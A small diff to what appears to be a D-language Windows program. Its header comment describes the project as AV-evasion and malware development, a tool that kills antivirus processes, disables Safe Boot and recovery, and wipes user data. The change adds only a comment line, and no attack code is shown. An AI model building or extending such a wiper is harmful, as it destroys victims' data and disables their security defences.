@@ -2,6 +2,7 @@ pragma(lib, "user32");
 /**
 This was my project to get more into AV evasion and malware dev.
 Terminates AV processes, disables Safe Boot/recovery, wipes user data, but leaves PC bootable.
+I have been working on this for quite a long while, around a couple of months.
 */
 
 import core.sys.windows.windows;
